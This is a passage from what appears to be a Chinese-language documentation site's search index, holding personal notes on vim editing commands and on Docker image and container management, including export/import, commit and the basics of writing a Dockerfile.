case\uff0c\u82e5\u8981\u7981\u7528\u5ffd\u7565\u5927\u5c0f\u5199\uff1a<code>:set noic</code></li> </ul> <p>\u914d\u5bf9\u547d\u4ee4</p> <ul> <li>\u5149\u6807\u7f6e\u4e8e\u62ec\u53f7\uff0c%\uff0c\u5339\u914d\u62ec\u53f7</li> <li>\u7f6e\u4e8e\u67d0\u4e2a\u5355\u8bcd\uff0c*\u987a\u5e8f\u67e5\u8be2\u76f8\u540c\u5355\u8bcd\uff0c#\u5012\u53d9\u67e5\u8be2</li> </ul> <p>\u66ff\u6362\u547d\u4ee4</p> <ul> <li> <p><code>s/old/new</code>\uff0c\u66ff\u6362\u5f53\u524d\u884c\u7b2c\u4e00\u4e2a\u5339\u914d\u4e32</p> </li> <li> <p><code>s/old/new/g</code>\uff0c\u66ff\u6362\u5149\u6807\u6240\u5728\u884c\u7684\u5339\u914d\u4e32</p> </li> <li><code>#,#s/old/new/g</code>\uff0c#,#\u4ee3\u8868\u9996\u5c3e\u4e24\u884c\u7684\u884c\u53f7\uff0c\u66ff\u6362\u8fd9\u4e24\u884c\u5185\u7684\u5339\u914d\u4e32</li> <li><code>%s/old/new/g</code>\uff0c\u76f4\u63a5\u66ff\u6362\u6574\u4e2a\u6587\u4ef6\u4e2d\u7684\u6bcf\u4e2a\u5339\u914d\u4e32</li> <li><code>%s/old/new/gc</code>\uff0c\u4f1a\u627e\u5230\u6574\u4e2a\u6587\u4ef6\u4e2d\u7684\u6bcf\u4e2a\u5339\u914d\u4e32\uff0c\u5e76\u4e14\u5bf9\u6bcf\u4e2a\u5339\u914d\u4e32\u63d0\u793a\u662f\u5426\u8fdb\u884c\u66ff\u6362</li> </ul> <p>\u5728 vim \u5185\u6267\u884c\u5916\u90e8\u547d\u4ee4</p> <ul> <li>\u8f93\u5165<code>:!</code>\u4e4b\u540e\uff0c\u518d\u8f93\u5165 shell \u547d\u4ee4\u5373\u53ef</li> </ul> <p>\u6253\u5f00\u3001\u4fdd\u5b58\u3001\u53e6\u5b58\u4e3a\u3001\u9000\u51fa</p> <ul> <li><code>:e &lt;path/to/file&gt;</code> \u2192 \u6253\u5f00\u4e00\u4e2a\u6587\u4ef6</li> <li><code>:w</code> \u2192 \u5b58\u76d8</li> <li><code>:saveas &lt;path/to/file&gt;</code> \u2192 \u53e6\u5b58\u4e3a <code>&lt;path/to/file&gt;</code></li> <li><code>:x</code>\uff0c <code>ZZ</code> \u6216 <code>:wq</code> \u2192 \u4fdd\u5b58\u5e76\u9000\u51fa (<code>:x</code> \u8868\u793a\u4ec5\u5728\u9700\u8981\u65f6\u4fdd\u5b58\uff0cZZ \u4e0d\u9700\u8981\u8f93\u5165\u5192\u53f7\u5e76\u56de\u8f66)</li> <li><code>:q!</code> \u2192 \u9000\u51fa\u4e0d\u4fdd\u5b58 <code>:qa!</code> \u5f3a\u884c\u9000\u51fa\u6240\u6709\u7684\u6b63\u5728\u7f16\u8f91\u7684\u6587\u4ef6\uff0c\u5c31\u7b97\u522b\u7684\u6587\u4ef6\u6709\u66f4\u6539\u3002</li> <li><code>:bn</code> \u548c <code>:bp</code> \u2192 \u4f60\u53ef\u4ee5\u540c\u65f6\u6253\u5f00\u5f88\u591a\u6587\u4ef6\uff0c\u4f7f\u7528\u8fd9\u4e24\u4e2a\u547d\u4ee4\u6765\u5207\u6362\u4e0b\u4e00\u4e2a\u6216\u4e0a\u4e00\u4e2a\u6587\u4ef6\u3002\uff08\u9648\u7693\u6ce8\uff1a\u6211\u559c\u6b22\u4f7f\u7528:n \u5230\u4e0b\u4e00\u4e2a\u6587\u4ef6\uff09</li> </ul> <p>\u9009\u62e9\u6027\u4fdd\u5b58</p> <ul> <li>v \u8fdb\u5165\u53ef\u89c6\u6a21\u5f0f\uff0c\u4f7f\u7528 hjkl \u9009\u62e9\u6240\u9700\u5185\u5bb9\uff0c\u4e5f\u53ef\u901a\u8fc7$\u3001%\u3001*/#\u30010 \u7b49\u65b9\u5f0f\u9009\u62e9</li> <li>\u9009\u62e9\u5b8c\u6bd5\u540e\u6309 : \u5b57\u7b26\u3002\u60a8\u5c06\u770b\u5230\u5c4f\u5e55\u5e95\u90e8\u4f1a\u51fa\u73b0 :'&lt;,'&gt; \u3002</li> <li>\u73b0\u5728\u8bf7\u8f93\u5165 <code>w TEST</code>\uff0c\u5176\u4e2d TEST \u662f\u4e00\u4e2a\u672a\u88ab\u4f7f\u7528\u7684\u6587\u4ef6\u540d\u3002\u786e\u8ba4\u60a8\u770b\u5230\u4e86:<code>'&lt;,'&gt;w TEST</code> \u4e4b\u540e\u6309 &lt;\u56de\u8f66&gt; \u952e\u3002</li> </ul> <p>\u63d0\u53d6\u548c\u5408\u5e76\u6587\u4ef6</p> <ul> <li><code>:r \u6587\u4ef6\u8def\u5f84/\u6587\u4ef6\u540d</code></li> <li>\u4e5f\u53ef\u4ee5<code>:r shell\u547d\u4ee4</code></li> <li>\u63d2\u5165\u7684\u5185\u5bb9\u51fa\u73b0\u5728\u5149\u6807\u5904</li> </ul> <p>\u8865\u5168\u529f\u80fd</p> <ul> <li><code>CTRL-D</code>\uff0c\u8f93\u5165:e \u540e\uff0c\u6309 CTRL-D\uff0c\u4f1a\u663e\u793a\u6240\u6709 e \u5f00\u59cb\u7684\u547d\u4ee4</li> <li><code>tab</code>\uff0c\u53ea\u80fd\u8865\u5168\u547d\u4ee4</li> </ul>"},{"location":"tools/vim/#references","title":"References","text":"<ul> <li>Vim \u7ec3\u7ea7\u653b\u7565</li> <li>Github Vimplus</li> </ul>"},{"location":"tools/docker/command/","title":"Docker \u547d\u4ee4","text":"<p>\u6240\u6709\u547d\u4ee4\u53ef\u4ee5\u5728\u5b98\u65b9\u6587\u6863\u7684 Reference\u4e0b\u7684 command-line reference \u4e2d\u67e5\u770b\u5177\u4f53\u4f7f\u7528\u65b9\u6cd5</p> <p>\u6216\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u4e2d\u8f93\u5165\uff1a<code>docker \u547d\u4ee4 --help</code>\uff0c\u5feb\u901f\u67e5\u770b\u547d\u4ee4\u7684 \u683c\u5f0f \u548c \u53ef\u9009\u9879</p> <p>\u67e5\u770b docker \u5360\u7528\u7a7a\u95f4\uff1a<code>docker system df</code>\uff0c\u4f1a\u5206\u522b\u663e\u793a\u955c\u50cf\u3001\u5bb9\u5668\u3001\u6570\u636e\u5377\u3001\u6784\u5efa\u7f13\u5b58\u7684\u5360\u7528\u7a7a\u95f4</p>"},{"location":"tools/docker/command/#_1","title":"\u955c\u50cf\u547d\u4ee4","text":""},{"location":"tools/docker/command/#1","title":"\u2460 \u83b7\u53d6\u955c\u50cf","text":"<p><code>docker pull NAME[:TAG]</code></p> <p>\u8be5\u547d\u4ee4\u76f4\u63a5\u4ece dockers hub \u955c\u50cf\u6e90\u6765\u4e0b\u8f7d\u955c\u50cf</p> <ul> <li> <p>NAME \u662f\u955c\u50cf\u4ed3\u5e93\u7684\u540d\u79f0</p> </li> <li> <p>TAG \u662f\u955c\u50cf\u7684\u6807\u7b7e\uff1a\u7528\u4e8e\u6807\u8bc6\u7248\u672c\u4fe1\u606f\uff0c\u7701\u7565\u65f6\uff0c\u9ed8\u8ba4\u6807\u7b7e\u4e3a latest</p> </li> </ul> <p>Example</p> <ul> <li> <p>docker pull ubuntu:14.04</p> </li> <li> <p>\u82e5\u4e0d\u662f\u5728 Docker Hub \u5b98\u65b9\u4ed3\u5e93\u4e0b\u8f7d\uff0c\u5219\u9700\u8981\u6307\u5b9a\u955c\u50cf\u6e90\uff1adocker pull hub.c.163.com/pubilc/ubuntu:14.04</p> </li> </ul>"},{"location":"tools/docker/command/#2","title":"\u2461 \u67e5\u770b\u955c\u50cf\u4fe1\u606f","text":"<p><code>docker images</code> = <code>docker image ls</code></p> \u53c2\u6570 \u6548\u679c -a \u663e\u793a\u8be6\u7ec6\u4fe1\u606f"},{"location":"tools/docker/command/#3","title":"\u2462 \u6dfb\u52a0\u955c\u50cf\u6807\u7b7e","text":"<p><code>docker tag NAME[:TAG] NAME[:TAG]</code></p> <p>Example</p> <p>docker tag ubuntu:latest myubuntu:latest</p>"},{"location":"tools/docker/command/#4","title":"\u2463 \u67e5\u770b\u955c\u50cf\u8be6\u7ec6\u4fe1\u606f","text":"<p><code>docker inspect NAME[:TAG]</code></p>"},{"location":"tools/docker/command/#5","title":"\u2464 \u67e5\u770b\u955c\u50cf\u5386\u53f2","text":"<p><code>docker history NAME[:TAG]</code></p>"},{"location":"tools/docker/command/#6","title":"\u2465 \u641c\u5bfb\u955c\u50cf","text":"<p><code>docker search NAME[:TAG]</code></p> <p>\u5176\u4f5c\u7528\u548c\u76f4\u63a5\u5728 docker hub \u4e0a\u641c\u7d22\u76f8\u4f3c\uff01</p>"},{"location":"tools/docker/command/#7","title":"\u2466 \u5220\u9664\u955c\u50cf","text":"<p><code>docker rmi ID</code></p> <p><code>docker rmi NAME[:TAG]</code></p>"},{"location":"tools/docker/command/#8","title":"\u2467 \u521b\u5efa\u955c\u50cf","text":"<p><code>docker commit -a \"\u4f5c\u8005\u540d\" -m \"\u6ce8\u91ca\" \u539f\u955c\u50cfid \u65b0\u955c\u50cfid:\u7248\u672c\u4fe1\u606ftag</code></p> \u53c2\u6570 \u6548\u679c -a \u4f5c\u8005\u4fe1\u606f -m \u6ce8\u91ca\u4fe1\u606f -p \u63d0\u4ea4\u65f6\u6682\u505c\u5bb9\u5668\u8fd0\u884c -c \u63d0\u4ea4\u65f6\u6267\u884c Dockerfile \u6307\u4ee4"},{"location":"tools/docker/command/#9","title":"\u2468 \u63d0\u4ea4\u955c\u50cf","text":"<p><code>docker push NAME:TAG</code></p>"},{"location":"tools/docker/command/#_2","title":"\u5bb9\u5668\u547d\u4ee4","text":"<p>\u5728\u6b64\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u6709\u76f8\u5e94\u7684\u955c\u50cf\uff0c\u5bb9\u5668\u662f\u955c\u50cf\u7684\u5b9e\u4f8b\uff01</p>"},{"location":"tools/docker/command/#_3","title":"\u4e00\u3001\u521b\u5efa\u5bb9\u5668","text":"<p>\u2460 \u65b0\u5efa\u5bb9\u5668\uff1a<code>docker create \u53c2\u6570 NAME[:TAG]</code></p> <p>\u8be5\u547d\u4ee4\u53c2\u6570\u7e41\u591a\uff0c\u4e00\u822c\u7528\u5230\u5982\u4e0b</p> \u53c2\u6570 \u6548\u679c -d \u662f\u5426\u5728\u540e\u53f0\u8fd0\u884c\u5bb9\u5668\uff0c\u9ed8\u8ba4\u4e3a\u5426\uff0c\u52a0\u4e0a-d \u8868\u793a\u5728\u540e\u53f0\u8fd0\u884c -i \u4fdd\u6301\u6807\u51c6\u8f93\u5165\u6253\u5f00\uff0c\u9ed8\u8ba4\u4e3a\u5426 -t \u662f\u5426\u5206\u914d\u4e00\u4e2a\u4f2a\u7ec8\u7aef\uff0c\u9ed8\u8ba4\u4e3a\u5426\uff0c\u4e00\u822c\u4e0e-i \u8054\u5408\u4f7f\u7528\uff0c\u5373-it --name \"\u522b\u540d\" \u6307\u5b9a\u5bb9\u5668\u7684\u522b\u540d -p \u4e3b\u673a\u7aef\u53e3\uff1a\u5bb9\u5668\u7aef\u53e3\uff08\u5c0f\u5199 p\uff09 \u5916\u7f51\u53ef\u4ee5\u901a\u8fc7\u4e3b\u673a\u7aef\u53e3\uff0c\u6765\u8bbf\u95ee\u76f8\u5e94\u7684\u5bb9\u5668\u7aef\u53e3 -P \uff08\u5927\u5199 P\uff09 \u968f\u673a\u6307\u5b9a\u7aef\u53e3 --rm \u5bb9\u5668\u9000\u51fa\u540e\u968f\u4e4b\u5c06\u5176\u5220\u9664\uff0c\u6d4b\u8bd5\u7528\uff0c\u4e00\u822c\u4f7f\u7528 docker rm \u624b\u52a8\u5220\u9664 <p>--name \u7684\u4e09\u79cd\u5177\u6709\u76f8\u540c\u6548\u679c\u7684\u7528\u6cd5</p> <ul> <li>--name=ubuntu</li> <li>--name ubuntu</li> <li>--name \"ubuntu\"</li> </ul> <p>\u2461 \u542f\u52a8\u5bb9\u5668\uff1a<code>docker start \u5bb9\u5668id\u6216\u5bb9\u5668\u522b\u540d</code></p> <p></p> <p>\u67e5\u770b\u8fd0\u884c\u4e2d\u5bb9\u5668\uff1a<code>docker ps</code></p> <p>\u67e5\u770b\u6240\u6709\u521b\u5efa\u7684\u5bb9\u5668\uff1a<code>docker ps -a</code></p> <p>\u2462 \u65b0\u5efa\u5e76\u542f\u52a8\u5bb9\u5668\uff1a<code>docker run \u53c2\u6570 NAME[:TAG]</code></p> <p>\u901a\u5e38\u4f7f\u7528\u5982\u4e0b\u53c2\u6570</p> <ul> <li>--name\uff1a\u8bbe\u7f6e\u522b\u540d</li> <li>-d\uff1a\u5728\u540e\u53f0\u8fd0\u884c\u5bb9\u5668</li> <li>-p\uff1a\u4e3b\u673a\u7aef\u53e3:\u5bb9\u5668\u7aef\u53e3\u7684\u6620\u5c04</li> <li>-it\uff1a\u8f93\u5165+\u7ec8\u7aef</li> <li>-v\uff1a\u6302\u8f7d\u5377</li> </ul> <p>\u68c0\u67e5\u672c\u5730\u662f\u5426\u5b58\u5728\u5bf9\u5e94\u955c\u50cf\uff0c\u4e0d\u5b58\u5728\uff0c\u5c31\u4ece\u5171\u6709\u4ed3\u5e93 pull \u4e0b\u8f7d</p> <p>\u5229\u7528\u955c\u50cf create \u521b\u5efa\u4e00\u4e2a\u5bb9\u5668\uff0c\u5e76\u4e14 start \u542f\u52a8\u5bb9\u5668</p> <p>\u2463 \u9000\u51fa\u5bb9\u5668</p> <p>\u9000\u51fa\u5bb9\u5668\u5e76\u7ec8\u6b62\u8fd0\u884c\uff1a<code>exit</code>\u3001<code>ctrl+d</code></p> <p>\u9000\u51fa\u5bb9\u5668\u4f46\u4e0d\u7ec8\u6b62\u8fd0\u884c\uff1a<code>ctrl+p+q</code></p> <p>\u2464 \u83b7\u53d6\u5bb9\u5668\u65e5\u5fd7\uff08\u5bb9\u5668\u7684\u5386\u53f2\u4f7f\u7528\u8f93\u51fa\u4fe1\u606f\uff09\uff1a<code>docker logs \u5bb9\u5668id\u6216\u5bb9\u5668\u522b\u540d</code></p>"},{"location":"tools/docker/command/#_4","title":"\u4e8c\u3001\u7ec8\u6b62\u5bb9\u5668","text":"<p>\u524d\u6587\u5df2\u7ecf\u63d0\u53ca\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>docker ps</code> \u67e5\u770b\u6240\u6709\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\uff0c\u800c\u5f53\u4f60\u4f7f\u7528 <code>exit</code> \u6216 <code>ctrl+d</code> \u65f6\u4f1a\u9000\u51fa\u5e76\u7ec8\u6b62\u5bb9\u5668\uff0c\u4e0d\u8fc7\u5f53\u4f60\u4f7f\u7528 <code>ctrl+p+q</code> \u9000\u51fa\u5bb9\u5668\u65f6\uff0c\u5bb9\u5668\u4ecd\u65e7\u5728\u540e\u53f0\u8fd0\u884c\u3002\u6b64\u5916\uff0c\u5f53\u4f60\u4f7f\u7528 <code>docker run -d NAME[:TAG]</code> \u540e\uff0c\u5bb9\u5668\u4e5f\u4f1a\u5728\u540e\u53f0\u7ee7\u7eed\u6267\u884c\u3002</p> <p>Example</p> <p>docker run -d --name \"myubuntu\" ubuntu /bin/sh -c \"while true;do echo hello world;sleep 1; done\"\u3011</p> <p>\u521b\u5efa\u5e76\u8fd0\u884c\u5bb9\u5668\u65f6\uff0c\u5bb9\u5668\u4ee5\u5b88\u62a4\u6001\uff08daemonized\uff09\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u56e0\u6b64\u9700\u8981\u7ec8\u6b62\u547d\u4ee4</p> <p>\u2460 \u7ec8\u6b62\u5bb9\u5668\uff1a<code>docker stop \u5bb9\u5668id\u6216\u5bb9\u5668\u522b\u540d</code></p> <p>\u2461 \u542f\u52a8\u5904\u4e8e\u7ec8\u6b62\u72b6\u6001\u7684\u5bb9\u5668\uff1a<code>docker start \u5bb9\u5668id\u6216\u5bb9\u5668\u522b\u540d</code></p> <p>\u2462 \u5c06\u4e00\u4e2a\u8fd0\u884c\u6001\u7684\u5bb9\u5668\u5148\u7ec8\u6b62\uff0c\u518d\u542f\u52a8\uff1a<code>docker restart \u5bb9\u5668id\u6216\u5bb9\u5668\u522b\u540d</code></p>"},{"location":"tools/docker/command/#_5","title":"\u4e09\u3001\u8fdb\u5165\u5bb9\u5668","text":"<p>\u2460<code>docker attach \u5bb9\u5668id\u6216\u5bb9\u5668\u522b\u540d</code></p> <p>\u8be5\u547d\u4ee4\u65e0\u6cd5\u8fdb\u5165\u4e00\u4e2a\u672a\u542f\u52a8\u7684\u5bb9\u5668\uff01</p> <p></p> <p>\u2461<code>docker exec -it \u5bb9\u5668id\u6216\u5bb9\u5668\u522b\u540d /bin/bash</code></p>"},{"location":"tools/docker/command/#_6","title":"\u56db\u3001\u5220\u9664\u5bb9\u5668","text":"<p>\u547d\u4ee4\uff1a<code>docker rm \u53c2\u6570 \u5bb9\u5668id\u6216\u5bb9\u5668\u522b\u540d</code></p> <p>\u53ef\u7528\u4e8e\u5220\u9664\u5904\u4e8e\u7ec8\u6b62\u6216\u9000\u51fa\u72b6\u6001\u7684\u5bb9\u5668\uff0c\u4f7f\u7528\u53c2\u6570-f \u53ef\u5f3a\u5236\u5220\u9664\u8fd0\u884c\u72b6\u6001\u7684\u5bb9\u5668</p> \u53c2\u6570 \u6548\u679c -f \u662f\u5426\u5f3a\u884c\u7ec8\u6b62\u5e76\u5220\u9664\u4e00\u4e2a\u8fd0\u884c\u4e2d\u7684\u5bb9\u5668 -l \u5220\u9664\u5bb9\u5668\u7684\u94fe\u63a5 link\uff0c\u4f46\u4fdd\u7559\u5bb9\u5668 -v \u5220\u9664\u5bb9\u5668\u6302\u8f7d\u7684\u6570\u636e\u5377"},{"location":"tools/docker/create-image/","title":"\u521b\u5efa\u955c\u50cf","text":"<p>\u521b\u5efa\u955c\u50cf\u7684\u65b9\u6cd5\u6709\u4e09\u79cd\uff1a</p> <ul> <li>\u57fa\u4e8e\u672c\u5730\u6a21\u677f\u5bfc\u5165</li> <li>\u57fa\u4e8e\u5df2\u6709\u955c\u50cf\u7684\u5bb9\u5668\u521b\u5efa</li> <li>\u57fa\u4e8e Dockerfile \u521b\u5efa</li> </ul>"},{"location":"tools/docker/create-image/#_2","title":"\u57fa\u4e8e\u672c\u5730\u6a21\u677f","text":"<p>\u4e00\u3001\u5bfc\u51fa\u5bb9\u5668</p> <p>\u5982\u679c\u8981\u5bfc\u51fa\u672c\u5730\u67d0\u4e2a\u5bb9\u5668\uff0c\u53ef\u4ee5\u4f7f\u7528<code>docker export</code>\u547d\u4ee4\u3002</p> <pre><code># docker ps -a\n------------------------------------------------------------------------------------------------------------\nCONTAINER ID   IMAGE          COMMAND      CREATED          STATUS                        PORTS     NAMES\n3ee1f9d5ea75   01187e1edca1   \"/bin/zsh\"   43 minutes ago   Exited (130) 15 minutes ago             Ethereum\n------------------------------------------------------------------------------------------------------------\n\ndocker export 3ee1f9d5ea75 &gt; Ethereum.tar\n</code></pre> <p>\u5728\u4e0a\u4f8b\u4e2d\uff0c\u6210\u529f\u5c06\u5bfc\u51fa\u5bb9\u5668\u7684\u5feb\u7167\u5230\u672c\u5730\u6587\u4ef6 <code>Ethereum.tar</code> \u4e2d\u3002</p> <p>\u4e8c\u3001\u5bfc\u5165\u5bb9\u5668</p> <p>\u53ef\u4ee5\u4f7f\u7528<code>docker import</code>\u4ece\u5bb9\u5668\u5feb\u7167\u6587\u4ef6\u4e2d\u518d\u5bfc\u5165\u4e3a\u955c\u50cf\uff0c\u4f8b\u5982</p> <pre><code>docker import Ethereum.tar test/ethereum:v1\n\n# docker images\n------------------------------------------------------------------------------------------------------------\nREPOSITORY          TAG             IMAGE ID       CREATED          SIZE\ntest/ethereum       v1              22a8ea6d529c   23 seconds ago   776MB\n------------------------------------------------------------------------------------------------------------\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a URL \u6216\u8005\u67d0\u4e2a\u76ee\u5f55\u6765\u5bfc\u5165\uff0c\u4f8b\u5982</p> <pre><code>docker import http://example.com/exampleimage.tgz example/imagerepo\n</code></pre> <p>Tip</p> <p>\u7c7b\u4f3c\u7684\uff0c\u901a\u8fc7 <code>docker save [IMAGE]</code> \u5c06 \u955c\u50cf \u4fdd\u5b58\u6210 tar \u5f52\u6863\u6587\u4ef6\uff0c\u7136\u540e\u4f7f\u7528 <code>docker load</code> \u5c06\u8be5\u5f52\u6863\u6587\u4ef6\u52a0\u8f7d\u4e3a\u955c\u50cf\u3002</p>"},{"location":"tools/docker/create-image/#_3","title":"\u57fa\u4e8e\u5df2\u6709\u955c\u50cf\u7684\u5bb9\u5668","text":"<p>\u8054\u5408\u6587\u4ef6\u7cfb\u7edf\uff1a\u4e00\u79cd \u5206\u5c42\u3001\u8f7b\u91cf\u7ea7\u5e76\u4e14\u9ad8\u6027\u80fd\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u5b83\u652f\u6301\u5bf9\u6587\u4ef6\u7cfb\u7edf\u7684\u4fee\u6539\u4f5c\u4e3a\u4e00\u6b21\u63d0\u4ea4\u6765\u4e00\u5c42\u5c42\u7684\u53e0\u52a0\uff0c\u540c\u65f6\u53ef\u4ee5\u5c06\u4e0d\u540c\u76ee\u5f55\u6302\u8f7d\u5230\u540c\u4e00\u4e2a\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\u4e0b\u3002</p> <p>\u8054\u5408\u6587\u4ef6\u7cfb\u7edf\u662f Docker \u955c\u50cf\u7684\u57fa\u7840\u3002\u955c\u50cf\u53ef\u4ee5\u901a\u8fc7\u5206\u5c42\u6765\u8fdb\u884c\u7ee7\u627f\uff0c\u57fa\u4e8e\u57fa\u7840\u955c\u50cf\uff08\u6ca1\u6709\u7236\u955c\u50cf\uff09\uff0c\u53ef\u4ee5\u5236\u4f5c\u5404\u79cd\u5177\u4f53\u7684\u5e94\u7528\u955c\u50cf\u3002</p> <p>\u91cd\u70b9\uff1a\u4e0d\u540c Docker \u5bb9\u5668\u5c31\u53ef\u4ee5\u5171\u4eab\u4e00\u4e9b\u57fa\u7840\u7684\u6587\u4ef6\u7cfb\u7edf\u5c42\uff0c\u540c\u65f6 \u518d\u52a0\u4e0a\u81ea\u5df1\u72ec\u6709\u7684\u6539\u52a8\u5c42\uff0c\u5927\u5927\u63d0\u9ad8\u4e86\u5b58\u50a8\u7684\u6548\u7387\u3002</p> <p>\u793a\u4f8b\u524d\u63d0\uff1a</p> <pre><code>docker images\n------------------------------------------------------------------------------------------------------------\nREPOSITORY           TAG       IMAGE ID       CREATED         SIZE\nhappytsing/ubuntu    latest    52199afd43c7   2 hours ago     813MB\n------------------------------------------------------------------------------------------------------------\n\ndocker ps -a\n------------------------------------------------------------------------------------------------------------\nCONTAINER ID   IMAGE          COMMAND      CREATED          STATUS                       PORTS     NAMES\n918d193c8d90   52199afd43c7   \"/bin/zsh\"   50 minutes ago   Up 50 minutes                          Ethereum\n------------------------------------------------------------------------------------------------------------\n</code></pre> <p>\u4e00\u3001\u67e5\u770b\u955c\u50cf\u4fe1\u606f\uff1a<code>docker inspect &lt;image_id&gt;</code></p> <pre><code>docker inspect 52199afd43c7\n\"RootFS\": {\n            \"Type\": \"layers\",\n            \"Layers\": [\n                \"sha256:350f36b271dee3d47478fbcd72b98fed5bbcc369632f2d115c3cb62d784edaec\",\n                \"sha256:0fbc1855e4122f25bd204ca5360de1012afc1bff6dfbd374611db4a71d33e623\"\n            ]\n},\n</code></pre> <p>\u4e8c\u3001\u57fa\u4e8e\u5bb9\u5668\u751f\u6210\u955c\u50cf\uff1a<code>docker commit &lt;container_id&gt; &lt;images_name&gt;:&lt;tag_name&gt;</code></p> \u53c2\u6570 \u6548\u679c -a \u4f5c\u8005\u4fe1\u606f -m \u6ce8\u91ca\u4fe1\u606f -p \u63d0\u4ea4\u65f6\u6682\u505c\u5bb9\u5668\u8fd0\u884c -c \u63d0\u4ea4\u65f6\u6267\u884c Dockerfile \u6307\u4ee4 <pre><code># \u6e90\u955c\u50cf\u662f\u4e00\u4e2aubuntu\u955c\u50cf\uff0c\u57fa\u4e8e\u8be5\u955c\u50cf\u7684\u5bb9\u5668\u53c8\u5b89\u88c5\u4e86go\u8bed\u8a00\u7b49\u5185\u5bb9\u3002\u5728\u6b64\u4fdd\u5b58\u4e00\u4e2a\u955c\u50cf\u3002\ndocker commit 918d193c8d90 ubuntu-go:latest\n\ndocker images\n--------------------------------------------------------------------\nREPOSITORY           TAG       IMAGE ID       CREATED         SIZE\nubuntu-go            latest    4e63f5675a43   7 minutes ago   2.2GB\nhappytsing/ubuntu    latest    52199afd43c7   2 hours ago     813MB\n--------------------------------------------------------------------\n\ndocker inspect 4e63f5675a43\n\"RootFS\": {\n            \"Type\": \"layers\",\n            \"Layers\": [\n                \"sha256:350f36b271dee3d47478fbcd72b98fed5bbcc369632f2d115c3cb62d784edaec\",\n                \"sha256:0fbc1855e4122f25bd204ca5360de1012afc1bff6dfbd374611db4a71d33e623\",\n                \"sha256:9637643a394e6c9dbee2236798898cad7def58fc18bc8d87f13d6eedeec78d45\"  # \u5bb9\u5668\u5c42\n            ]\n},\n</code></pre> <p>Docker \u955c\u50cf\u90fd\u662f\u53ea\u8bfb\u7684\uff0c\u5f53\u5bb9\u5668\u542f\u52a8\u65f6\uff0c\u4e00\u4e2a\u65b0\u7684\u53ef\u5199\u5c42\u88ab\u52a0\u8f7d\u5230\u955c\u50cf\u7684\u9876\u90e8\uff0c\u8be5\u5c42\u79f0\u4e3a\u5bb9\u5668\u5c42\u3002</p> <p></p> <p>Warning</p> <p><code>docker commit</code> \u547d\u4ee4\u9664\u4e86\u5b66\u4e60\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u5e94\u7528\u573a\u5408\uff0c\u6bd4\u5982\u88ab\u5165\u4fb5\u540e\u4fdd\u5b58\u73b0\u573a\u7b49\u3002</p> <p>\u4f46\u662f\uff0c\u4e0d\u8981\u4f7f\u7528 <code>docker commit</code> \u5b9a\u5236\u955c\u50cf\uff0c\u5b9a\u5236\u955c\u50cf\u5e94\u8be5\u4f7f\u7528 Dockerfile \u6765\u5b8c\u6210\u3002</p>"},{"location":"tools/docker/create-image/#dockerfile","title":"\u57fa\u4e8e Dockerfile","text":"<p>2021.10.12 \u66f4\u65b0</p>"},{"location":"tools/docker/create-image/#_4","title":"\u91cd\u8981\u547d\u4ee4","text":"<p>Dockerfile \u547d\u4ee4</p> <p>FROM \u6307\u5b9a\u57fa\u7840\u955c\u50cf</p> <p>\u6240\u8c13\u5b9a\u5236\u955c\u50cf\uff0c\u90a3\u4e00\u5b9a\u662f\u4ee5\u4e00\u4e2a\u955c\u50cf\u4e3a\u57fa\u7840\uff0c\u5728\u5176\u4e0a\u8fdb\u884c\u5b9a\u5236\uff0cFROM \u547d\u4ee4\u6b63\u662f\u8d77\u5230\u8fd9\u4e2a\u4f5c\u7528\uff0c\u56e0\u6b64\u4e00\u4e2a Dockerfile \u4e2d FROM \u662f\u5fc5\u5907\u7684\u6307\u4ee4\uff0c\u5e76\u4e14**FROM \u5fc5\u987b\u662f\u7b2c\u4e00\u6761\u6307\u4ee4**\u3002</p> <p>Docker \u8fd8\u5b58\u5728\u4e00\u4e2a\u7279\u6b8a\u7684\u955c\u50cf\uff0c\u540d\u4e3a scratch\u3002\u8fd9\u4e2a\u955c\u50cf\u662f\u865a\u62df\u7684\u6982\u5ff5\uff0c\u5e76\u4e0d\u5b9e\u9645\u5b58\u5728\uff0c\u5b83\u8868\u793a\u4e00\u4e2a\u7a7a\u767d\u7684\u955c\u50cf\u3002</p> <pre><code>FROM ubuntu:latest\n</code></pre> <p>Label \u6dfb\u52a0\u5143\u6570\u636e</p> <p>\u4e00\u822c\u7528\u6765\u7533\u660e\u955c\u50cf\u7684\u4f5c\u8005\u3001\u6587\u6863\u5730\u5740\u7b49</p> <pre><code>LABEL All_rights_reserved=\"wangleqing.00@qq.com\"\n</code></pre> <p>\u4f7f\u7528 docker inspect \u67e5\u770b\u5bb9\u5668\u6216\u955c\u50cf\u4fe1\u606f\u65f6\uff0c\u53ef\u4ee5\u770b\u5230\uff1a</p> <p></p> <p>RUN \u6267\u884c\u547d\u4ee4</p> <p>\u7528\u6765\u6267\u884c\u547d\u4ee4\u884c\u547d\u4ee4\u7684\uff0c\u5176\u683c\u5f0f\u6709\u4e24\u79cd\uff1a</p> <ul> <li>shell \u683c\u5f0f\uff1a<code>RUN &lt;\u547d\u4ee4&gt;</code>\uff0c\u5c31\u50cf\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u4e2d\u8f93\u5165\u7684\u547d\u4ee4\u4e00\u6837</li> <li>exec \u683c\u5f0f\uff1a<code>RUN [\"\u53ef\u6267\u884c\u6587\u4ef6\", \"\u53c2\u65701\", \"\u53c2\u65702\"]</code>\uff0c\u8fd9\u66f4\u50cf\u662f\u51fd\u6570\u8c03\u7528\u4e2d\u7684\u683c\u5f0f\u3002</li> </ul> <p>\u5728 Dockerfile \u4e2d\uff0c\u6bcf\u4e00\u4e2a\u6307\u4ee4\u5c31\u4f1a\u5efa\u7acb\u4e00\u5c42\uff0cRUN \u4e5f\u4e0d\u4f8b\u5916\uff0c\u56e0\u6b64\u6211\u4eec\u5c3d\u91cf\u4e00\u6b21 RUN \u6307\u4ee4\u6267\u884c\u5b8c\u6240\u6709\u547d\u4ee4\uff0c\u4f7f\u7528 <code>&amp;&amp;</code> \u6216\u8005 <code>;</code> 